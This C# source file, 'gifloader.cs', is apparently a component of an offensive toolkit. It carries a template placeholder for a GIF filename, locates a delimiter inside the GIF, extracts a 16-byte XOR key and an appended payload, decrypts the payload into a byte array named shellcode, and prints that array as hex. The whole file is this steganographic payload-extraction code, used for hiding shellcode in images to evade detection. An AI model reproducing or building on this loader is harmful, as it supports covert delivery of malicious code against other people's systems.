using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Linq;
using System.Text;

/*
 * Compiling:
 *  c:\windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /platform:x64 gifloader.cs
 */

namespace GifReader
{
    public class GifReader
    {
		static void Main()
		{
		byte[] gif = File.ReadAllBytes("###GIFNAME###");

                byte[] pattern = { 0x2f, 0x2f, 0x2f, 0x2f, 0x2f }; // our delimiter
                int delimiter = ByteSearch(gif, pattern) + 5; // +5 to scan to end of delimiter

                // XOR key is 16 bytes
                byte[] xorkey = gif.Skip(delimiter).Take(16).ToArray();

                // Structure is /////XOR KEY (16 bytes)/////Payload;
                // Need to skip ahead 21 to get to start of payload
                // Final take is gif.Length - delimiter - 22 to avoid reading ; at end of gif
                byte[] payload = gif.Skip(delimiter + 21).Take(gif.Length - delimiter - 22).ToArray();

		// new variable to store decrypted shellcode
                byte[] shellcode = { 0x00 };
		shellcode = XOR(payload, xorkey);

                int idx = 0;
                while (idx < shellcode.Length)
                {
                    Console.Write("0x{0}, ", shellcode[idx].ToString("x2"));
                    idx = idx + 1;
                }

            }
		
	public static byte[] XOR(byte[] text, byte[] key)
        {
          byte[] xor = new byte[text.Length];
          for (int i = 0; i < text.Length; i++)
          {
			  xor[i] = (byte)(text[i] ^ key[i % key.Length]);
          }
          return xor;
        }

        // https://boncode.blogspot.com/2011/02/net-c-find-pattern-in-byte-array.html
        private static int ByteSearch(byte[] searchIn, byte[] searchBytes, int start = 0)
        {
            int found = -1;
            bool matched = false;
            //only look at this if we have a populated search array and search bytes with a sensible start
            if (searchIn.Length > 0 && searchBytes.Length > 0 && start <= (searchIn.Length - searchBytes.Length) && searchIn.Length >= searchBytes.Length)
            {
                //iterate through the array to be searched
                for (int i = start; i <= searchIn.Length - searchBytes.Length; i++)
                {
                    //if the start bytes match we will start comparing all other bytes
                    if (searchIn[i] == searchBytes[0])
                    {
                        if (searchIn.Length > 1)
                        {
                            //multiple bytes to be searched we have to compare byte by byte
                            matched = true;
                            for (int y = 1; y <= searchBytes.Length - 1; y++)
                            {
                                if (searchIn[i + y] != searchBytes[y])
                                {
                                    matched = false;
                                    break;
                                }
                            }
                            //everything matched up
                            if (matched)
                            {
                                found = i;
                                break;
                            }

                        }
                        else
                        {
                            //search byte is only one bit nothing else to do
                            found = i;
                            break; //stop the loop
                        }

                    }
                }
            }
            return found;
        }
    }
}

